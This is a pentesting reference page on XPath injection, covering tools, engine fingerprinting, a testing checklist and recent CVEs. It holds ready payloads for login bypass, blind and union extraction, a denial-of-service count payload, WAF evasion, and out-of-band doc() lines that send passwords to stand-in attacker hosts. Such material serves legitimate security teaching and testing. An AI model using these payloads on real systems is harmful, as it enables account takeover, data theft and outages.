+++
title = 'XPath Injection'
date = 2026-10-30
type = 'notes'
weight = 160
toc = true
tags = ['web', 'web-attacks', 'xpath', 'injection']
+++

XML Path Language (XPath) is a query language for selecting nodes from XML documents, used by applications that store or retrieve data in XML — user stores, configuration files, SOAP/SAML backends, and legacy XML databases.

When user input is concatenated into an XPath expression without sanitisation, an attacker can rewrite the query's logic. Because **XPath has no privilege model**, a successful injection typically exposes the **entire document** rather than a single row — there is no table-level or column-level access control to stop it.

> **2025–2026 context:** XPath injection has moved out of "legacy XML auth" and into **libraries that parse XML for security decisions** — XML signature verification (XML::Sig), SAML processing (samlify), AI agent browser tools (smolagents), and content-filtering engines (changedetection.io). The common thread is the same as SQLi: a trusted library builds a query from untrusted data, and the escaping function it already has is not called.

---

## 1. Tools

| Tool | What it does |
|---|---|
| **XCat** (`orf/xcat`) | CLI for **blind** XPath injection — retrieves the whole XML document, reads arbitrary files on the host filesystem, and uses **out-of-bound HTTP requests** to make the server send data directly to the attacker |
| **xxxpwn** (`feakk/xxxpwn`) | Blind-optimised XPath 1.0 extraction — uses **query optimisations** to minimise the number of requests needed to extract a value |
| **xxxpwn_smart** (`aayla-secura`) | Fork of xxxpwn using **predictive text** — guesses the next character from a language model, reducing requests further |
| **XmlChor** (`Harshal35/XmlChor`) | XPath injection exploitation tool |
| **xpath-blind-explorer** (`micsoftvn`) | Blind XPath exploration utility |
| **Nuclei template** (`owasp-wstg-inpv-09`) | Injects a single apostrophe into `id`, `user`, `search`, `q` to provoke an XPath/XML parser exception and matches engine error fingerprints (`XPathException`) — a fast **detection** pass |

### 1.1 XCat

```bash
pip3 install cython
pip3 install xcat
```

```text
xcat detect:  detect and print the type of injection found
xcat injections:  print all supported injection types
xcat run:  retrieve the XML document by exploiting the injection
xcat shell:  xcat shell to run system commands
```

**Detect a non-blind endpoint:**

```bash
xcat detect <url> <vulnerable-param> param1=value1 param2=value2 \
  --true-string='invalid-input-string'
```

**Exfiltrate the XML document (POST + form encoding):**

```bash
xcat run <url> <vulnerable-param> param1=value1 \
  --true-string=successfully -m POST --encode FORM
```

> **XCat is the fastest path from a confirmed blind injection to the full document.** It handles the schema-discovery loop and the character extraction that would otherwise be a hand-written script — and its OOB mode works when the response gives no boolean signal at all.

### 1.2 xxxpwn — blind extraction optimisations

xxxpwn is specifically designed for **XPath 1.0 blind** injection, where each request can only answer a boolean question. It uses **query optimisations** to pack more information into each request than a naive `substring()` loop. `xxxpwn_smart` extends it with **predictive text** — after extracting a few characters, it guesses the rest of the word and verifies the guess in a single request.

---

## 2. XPath Fundamentals

### 2.1 Basic concepts

An XML document is a tree of **nodes**. The top element is the **root element node**. Every node except the root has exactly one **parent node**; element nodes may have any number of **child nodes**. Nodes with the same parent are **siblings**; traversing up or down gives **ancestor** and **descendant** nodes.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<bookstore>
  <book>
    <title lang="en">The name of the rose</title>
    <author>Umberto Eco</author>
    <price currency="dollar">5,00</price>
    <category>Novel</category>
  </book>
</bookstore>
```

- `bookstore` is the **root element node**.
- `title`, `author`, `price`, `category` are **element nodes**.
- `lang`, `currency` are **attribute nodes**.
- `title`, `author`, `price`, `category` are **siblings**; `book` is their **parent**.

### 2.2 Selecting nodes

A query is evaluated from a **context node**, which is its starting point — the same query can return different results depending on context.

| Query | Selects |
|---|---|
| `example` | All `example` child nodes of the context node |
| `/` | The document root |
| `//` | Descendant nodes of the context node |
| `.` | The context node |
| `..` | The parent of the context node |
| `@attr` | The `attr` attribute of the context node |
| `text()` | All text node children of the context node |
| `query1 \| query2` | Union of two queries |

**Composite examples:**

```xpath
/bookstore/book                  # all book children of bookstore
/bookstore//title                # all title descendants of bookstore
/bookstore/book/price/@currency  # all currency attributes on price nodes
//book                           # all books anywhere
//@currency                      # all currency attributes anywhere
```

> **Any query starting with `//` is evaluated from the document root**, not the context node.

### 2.3 Predicates

Predicates filter results, like a SQL `WHERE` clause, and are enclosed in `[]`:

```xpath
/bookstore/book[1]                          # first book
/bookstore/book[position()<10]              # first 9 books
//book/title[@lang]/../category             # category of every book with a lang attribute
```

**Wildcards:**

| Wildcard | Matches |
|---|---|
| `node()` | Any node |
| `*` | Any element node |
| `@*` | Any attribute node |

> `*` matches **any node at that step**, not any descendant. Use `//` or an explicit path (`/*/*/title`) for deeper matching.

### 2.4 Useful built-in functions

| Function | Purpose |
|---|---|
| `string(node)` | Stringify a node |
| `string-length(s)` | Length of a string |
| `substring(s, start, len)` | Slice — **1-indexed** |
| `concat(a, b, …)` | Concatenate |
| `count(nodeset)` | Count nodes |
| `name(node)` / `local-name(node)` | Node name |
| `boolean()` / `not()` | Coerce / negate |
| `position()` / `last()` | Index helpers |
| `contains(s, sub)` | Substring presence |
| `starts-with(s, prefix)` | Prefix check |
| `codepoints-to-string(n)` | **XPath 2.0+** — code point to character |
| `doc(uri)` | **XPath 2.0+** — load an external document |

---

## 3. Identifying Injection

### 3.1 Likely injection shapes

| Surface | Likely XPath |
|---|---|
| Login form | `//user[username='$U' and password='$P']` |
| Settings lookup | `//config[@key='$INPUT']/value` |
| User profile | `//user[@id='$ID']` |
| Search bar | `//doc[contains(., '$Q')]` |



**Detection:** inject a single `'`. An XPath parse error, a changed result set, or a stack trace containing `XPathException` confirms the input reaches an XPath expression.

### 3.2 Fingerprint the engine

| Probe | Tells you |
|---|---|
| `' or '1'='1` | Classic tautology — works on every XPath engine |
| `/preceding::/comment()` | XPath 2.0+ (more flexible axes) |
| `'/concat('a','b')` | XPath 1.0 (supports `concat`) |
| Error contains `saxon` | Saxon engine (XPath 2.0/3.1) |
| Error contains `Xalan` | Xalan (XPath 1.0) |
| Error contains `lxml` | libxml2 / Python lxml |
| Error contains `DOMXPath` | PHP DOMXPath (XPath 1.0) |



> **Why the engine matters:** XPath 2.0+ gives you `doc()` (OOB exfiltration), `unparsed-text()` (arbitrary file read), `matches()` (regex), and `codepoints-to-string()` (binary-search extraction). XPath 1.0 is what most legacy applications still use, and it has none of these.

---

## 4. Authentication Bypass

The vulnerable pattern:

```xpath
/users/user[username/text()='<username>' and password/text()='<password>']
```

### 4.1 Basic tautology

```xpath
username = ' or '1'='1
password = ' or '1'='1

→ /users/user[username/text()='' or '1'='1' and password/text()='' or '1'='1']
```

Logs in as the **first user** in the document.

### 4.2 Targeting a known username

Because `and` binds tighter than `or`, putting the tautology in the **username** field targets a specific account; putting it in the **password** field makes the predicate true for every user and logs you in as the first one:

```xpath
username = administrator' or '1'='1
password = anything

→ /users/user[username/text()='administrator' or '1'='1' and password/text()='<hash>']
```

### 4.3 Hashed passwords — the double-`or` condition

In realistic applications the password is hashed, so a password payload is hashed before it reaches the query. Inject a **double `or`** to force a universally true condition:

```xpath
username = ' or true() or '
password = ' or '1'='1

→ /users/user[username/text()='' or true() or '' and password/text()='<MD5-hash>']
```

**Why this works:** `and` is resolved first. No user has a password equal to the MD5 hash, so the `and` clause is `false`. The expression reduces to `username='' or true() or false`, which is `true` for **every** `<user>` node. The application takes the first node and logs you in as the first user.

### 4.4 Position-based targeting

To log in as a specific **position** without knowing the username:

```xpath
username = ' or position()=2 or '
password = ' or '1'='1

→ /users/user[username/text()='' or position()=2 or '' and password/text()='<hash>']
```

`position()=1` selects the first user, `position()=2` the second, and so on.

### 4.5 Substring targeting

If you know part of a username:

```xpath
username = ' or contains(.,'admin') or '
password = ' or '1'='1
```

This matches any user whose **entire node** contains `admin` — useful when the privileged account is `administrator`, `admin`, or `svc_admin` and you do not know which.

### 4.6 `name()`-based bypass (WAF evasion)

When a WAF blocks `'1'='1` but allows node tests, use `name()` instead of a value comparison:

```xpath
x' or name()='username' or 'x'='y
```

This is true for any element named `username`, so the predicate matches and authentication succeeds.

### 4.7 Double-quote variant

For queries that wrap input in double quotes (`//user[name="INPUT"]`):

```xpath
") or ("1"="1
```

---

## 5. Data Exfiltration — In-Band

### 5.1 Union-based extraction

XPath's union operator `|` combines two queries, exactly like SQL's `UNION`:

```xpath
' | //user/username | '
' | //user/password | '
' | //user/email | '
```



**Full-document extraction** — append a query that returns every text node:

```http
GET /search.php?q=SOMETHINGINVALID&f=title+|+//text() HTTP/1.1
```

The executed query becomes:

```xpath
/a/b/c[contains(d/text(), 'SOMETHINGINVALID')]/title | //text()
```

The second query returns **every text node in the document**, so the response contains all stored data.

### 5.2 Identifying schema depth

When the application returns only a single value, you must map the schema first. Inject a union with a subquery from the document root:

```xpath
<XPath Query> | /*[1]
```

`/*[1]` selects the document root's first child — the root element node. The application expects a single value and receives an **array**, so it typically returns nothing. Append `/*[1]` iteratively until the response changes:

```xpath
<XPath Query> | /*[1]
<XPath Query> | /*[1]/*[1]
<XPath Query> | /*[1]/*[1]/*[1]
...
```

When data finally appears, you have found the depth of that branch.

### 5.3 Enumerating siblings

Once the depth is known, vary the **last** index to enumerate sibling nodes:

```xpath
<XPath Query> | /*[1]/*[1]/*[1]/*[1]
<XPath Query> | /*[1]/*[1]/*[1]/*[2]
<XPath Query> | /*[1]/*[1]/*[1]/*[3]
...
<XPath Query> | /*[1]/*[2]/*[1]/*[1]
<XPath Query> | /*[1]/*[2]/*[1]/*[2]
...
```

> **This is a script job, not a manual one.** The combinatorial space grows quickly — write a loop that walks the tree and records every value returned.

---

## 6. Blind Exfiltration

When results are not reflected, the application still gives a **boolean oracle** — a valid/invalid response, a different page, or a different error. XPath has no `sleep()`, so timing is not the first choice; boolean extraction is.

### 6.1 Boolean oracle — string length

```xpath
' and string-length(//user[1]/password)=8 and ''='
```

Iterate the length until the response matches a valid request.

### 6.2 Boolean oracle — character-by-character

```xpath
' and substring(//user[1]/password,1,1)='a' and ''='
```

`substring()` is **1-indexed**. Iterate the character and the position until the full value is extracted.

### 6.3 Binary search — the efficiency refinement

Instead of trying every character, compare against a midpoint:

```xpath
' and substring(//user[1]/password,1,1)>'m' and ''='
```

This **halves the candidate set per request** — roughly **7 requests per character** for a printable-ASCII range, versus ~48 for a linear scan.

**XPath 2.0 variant** — compare code points directly:

```xpath
substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)
```



### 6.4 Alternative string functions (when `substring` is filtered)

| Function | Payload |
|---|---|
| **`starts-with()`** | `' and starts-with(//user[1]/password,'a') and ''='` — chain growing prefixes |
| **`contains()`** | `' and contains(//user[1]/password,'adm') and ''='` — dictionary confirmation |
| **`count()`** | `' and count(//user)=3 and ''='` — node-count oracle for enumeration sizing |



### 6.5 Schema discovery — blind

Before extracting values, map the structure:

| Goal | Payload |
|---|---|
| Root node name | `' or name(/*[1])='root' or ''='` |
| Root name length | `' or string-length(name(/*[1]))=5 and ''='` |
| Root name chars | `' or substring(name(/*[1]),1,1)='b' and ''='` |
| Child count | `' or count(/*[1]/*)=3 and ''='` |
| Attribute count | `' and count(/*[1]/*[1]/@*)>0 and ''='` |
| Child element names | `' or name(//user[1]/*[1])='username' or ''='` |
| Field hunting | `' or //*[contains(name(),'pass')] or ''='` |



### 6.6 Time-based exploitation

When the response is **identical** for true and false, the only remaining in-band channel is **processing time**. XPath has no `sleep()`, but you can force the engine to do exponential work:

```xpath
invalid' or substring(/users/user[1]/username,1,1)='a'
  and count((//.)[count((//.))]) and '1'='1
```

If the condition is true, the second `and` clause is evaluated, and the nested `count((//.)[count((//.))])` forces an **exponential iteration** over the document — a measurable delay. If false, the expensive clause is skipped.

> **The double `count` is the payload.** `(//.)[count((//.))]` builds a node-set filtered by an index equal to the total node count — the engine must evaluate the inner `count` for every node in the outer set. On a large document this is effectively a **denial-of-service** and can hang the application. Use with care on production targets.

### 6.7 Out-of-band (OOB) exfiltration

**XPath 2.0+** engines that expose `doc()` can be made to fetch an attacker-controlled URL, carrying data in the path:

```xpath
' and doc(concat('http://oast.example/',//user[1]/password))=0 and ''='
```

Or encode the value to make it URL-safe:

```xpath
... and doc(concat('http://oob/', encode-for-uri(//user[1]/password)))
```

**SMB variant** (Windows targets):

```xpath
... and doc('//10.10.10.10/SHARE')
```



> **OOB requires an XPath 2.0 engine that permits network access** — Saxon, BaseX, and some .NET implementations. XPath 1.0 has no `doc()` and cannot be used this way.

---

## 7. Error-Based Extraction

When errors are displayed, the error message itself becomes the exfiltration channel. On engines that raise on invalid expressions, force the engine to evaluate a computed value inside the error:

```xpath
' and count(//*) = 1 and string(1 div 0) and ''='
```

On MySQL-backed applications, `extractvalue()` and `updatexml()` take an **XPath expression** as an argument — the error message contains the result:

```sql
extractvalue(1,concat(0x7e,(//user[1]/password)))
updatexml(1,concat(0x7e,(SELECT version())),1)
```



> **This is XPath *inside* SQL.** `extractvalue` and `updatexml` are MySQL functions that parse their second argument as XPath. The error-based technique is useful when the application's own XPath output is suppressed but its SQL errors are visible.

---

## 8. WAF and Filter Evasion

| Filtered | Bypass |
|---|---|
| `1=1` | `position()=1` / `name()='username'` / `true()` |
| `substring()` | `starts-with()` / `contains()` / `codepoints-to-string()` |
| `and` / `or` | Reorder the predicate — inject through the other parameter |
| Single quotes | Double-quote variant `") or ("1"="1` |
| `//` | Long-form axes: `child::`, `descendant::` |
| Spaces | XPath has no whitespace-free equivalent — encode or use the application's own parser quirks |

**The core WAF insight:** blocklists match **literal strings**. `position()=1` is not `1=1`; `name()='username'` is not a value comparison; `starts-with` is not `substring`. Each is a semantically equivalent way to express a true predicate that the filter has never seen.

> **XPath 1.0 has no escape sequence for a quote inside a same-quoted literal.** This is why **variable binding** — not escaping — is the correct defence: the value never enters the expression text at all.

---

## 9. Real-World CVEs (2025–2026)

| CVE / Advisory | Product | Primitive |
|---|---|---|
| **CVE-2025-11844** | Hugging Face smolagents < 1.22.0 | XPath injection in `search_item_ctrl_f` in `vision_web_browser.py` — local data extraction and arbitrary DOM traversal |
| **CVE-2026-9390** | Perl XML::Sig < 0.71 | `verify()` and `_get_signed_xml()` concatenate the `SignedInfo/Reference/@URI` value into an XPath expression **without escaping or NCName validation** — a quote in the URI rewrites which node is selected for digest verification, **bypassing XML signature verification** |
| **CVE-2026-46490** | samlify < 2.13.0 | Template substitution escapes only attribute contexts — XML injection in `AttributeValue` → **privilege escalation in signed SAML assertions** |
| **CVE-2026-29039** | changedetection.io < 0.54.4 | User-supplied XPath in `include_filters`, processed by `elementpath` (XPath 3.0/3.1). `unparsed-text()` reads **arbitrary files** — no validation of dangerous functions → **arbitrary file read** |
| **CVE-2026-4645** | `xpath` package | Crafted Boolean expression causes an **infinite loop** in `logicalQuery.Select` → 100% CPU → **DoS** |
| **CVE-2025-9714** | libxml2 ≤ 2.9.14 | Uncontrolled recursion in XPath evaluation → DoS |
| **CVE-2025-XXXX** | Concrete5 CMS 9.1.3 | XPath injection |

> **The pattern across every 2025–2026 entry:** XPath is being used for **security decisions** (signature verification, SAML attribute parsing) and **content processing** (AI browser tools, change detection), not just user lookup. The injection point is inside a library, and the library's escaping function is either missing or not called.

---

## 10. Testing Methodology

```text
1. Identify XPath-backed inputs
   - Login, search, filters, profile lookups, config reads
   - SOAP/SAML backends, XML-driven CMSes, legacy directories

2. Detect with a single quote
   - ' → error / changed result / XPathException stack trace
   - Error text fingerprints the engine (Saxon, Xalan, lxml, DOMXPath)

3. Auth bypass
   - ' or '1'='1  on both fields
   - admin' or '1'='1  for a known username
   - ' or true() or ' + ' or '1'='1  for hashed passwords
   - ' or position()=2 or '  for a specific index

4. In-band extraction
   - ' | //text()  dumps the entire document
   - If only one value is returned, map the schema with /*[1] iterations

5. Blind extraction
   - string-length() → length
   - substring(...,pos,1)='c' → character loop
   - substring(...,pos,1)>'m' → binary search (7 req/char)
   - starts-with() / contains() when substring is filtered

6. Schema discovery (blind)
   - name(/*[1]) → root name
   - count(/*[1]/*) → child count
   - //*[contains(name(),'pass')] → field hunting

7. Time-based (only when boolean is unavailable)
   - count((//.)[count((//.))])  → exponential delay
   - WARNING: can DoS the application

8. Out-of-band (XPath 2.0+ only)
   - doc(concat('http://oast/',//user[1]/password))
   - doc('//attacker/SHARE')

9. WAF evasion
   - position()=1 instead of 1=1
   - name()='username' instead of a value comparison
   - starts-with() instead of substring()

10. Automate
    - xcat run for the full document
    - xxxpwn / xxxpwn_smart for blind optimisation
```

---

## 11. Field Notes

- **XPath has no privilege model.** A successful injection exposes the **whole document** — there is no per-row or per-column restriction to stop it.
- **`and` binds tighter than `or`.** This is why the tautology belongs in the **username** field when targeting a known account, and why the double-`or` is needed when the password is hashed.
- **No comments in XPath.** Unlike SQL, there is no `--` or `#` to truncate a query. Use bracket termination (`']/*[1`), null bytes (implementation-dependent), or a second predicate.
- **Blind extraction should use binary search.** `substring(...,1,1)>'m'` halves the candidate set per request — roughly 7 requests per character instead of 48.
- **`starts-with()` and `contains()` are the fallbacks when `substring()` is filtered.** Both are standard XPath 1.0 functions and both give a boolean oracle.
- **Time-based XPath is a DoS primitive.** The exponential `count` payload works, but on a large document it hangs the application — use it only when every other channel is closed.
- **OOB needs XPath 2.0.** `doc()` is not available in XPath 1.0, which is what most legacy applications use. Fingerprint the engine before planning an OOB extraction.
- **XPath injection now lives in signature verification.** CVE-2026-9390 is an XPath injection inside an **XML signature verifier** — the injected expression decides which node is digested, bypassing the signature entirely.
- **`unparsed-text()` is the 2026 file-read primitive.** CVE-2026-29039 allows arbitrary file read through a user-supplied XPath filter — the XPath 3.1 equivalent of PHP's `file_get_contents()`.
- **The durable fix is variable binding, not escaping.** XPath 1.0 cannot escape a quote inside a same-quoted literal — bind the value to a variable so it never enters the expression text.

---

This file sits alongside the **SQL Injection**, **NoSQL Injection**, and **LDAP Injection** notes: the injection concepts transfer directly, and the blind-extraction techniques — boolean oracle, binary search, out-of-band — are the same across all four classes.
